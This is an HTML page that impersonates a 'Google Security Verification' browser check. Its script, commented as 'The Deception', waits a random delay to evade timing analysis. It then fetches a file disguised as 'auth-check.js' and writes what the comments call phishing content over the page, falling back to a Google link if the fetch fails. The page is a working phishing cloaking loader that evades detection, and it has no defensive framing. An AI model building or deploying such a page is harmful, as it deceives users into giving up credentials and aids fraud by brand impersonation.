<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f8f9fa;
            color: #3c4043;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 3px solid #f1f1f1;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 14px;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Performing security verification...</p>
        <p>Please wait while we check your browser.</p>
    </div>

    <script>
        // Layer 2: The Deception
        // Wait a random human-reading-time delay (3-6 seconds) before fetching the real page.
        // This mimics a user reading the "Verification" message.
        const delay = 3000 + Math.random() * 3000;
        console.log(`[DEBUG] Waiting ${Math.round(delay/1000)}s to bypass timing analysis...`);

        setTimeout(() => {
            // Dynamically import the malicious content from a separate, seemingly benign file.
            // This file is named 'auth-check.js' to appear legitimate.
            fetch('/auth-check.js')
                .then(response => response.text())
                .then(data => {
                    // Parse the response and write the actual phishing content to the document.
                    document.open();
                    document.write(data);
                    document.close();
                })
                .catch(err => {
                    console.error("Verification step failed:", err);
                    document.body.innerHTML = '<p style="text-align:center;">Verification complete. <a href="https://www.google.com">Proceed to Google.com</a></p>';
                });
        }, delay);
    </script>
</body>
</html>
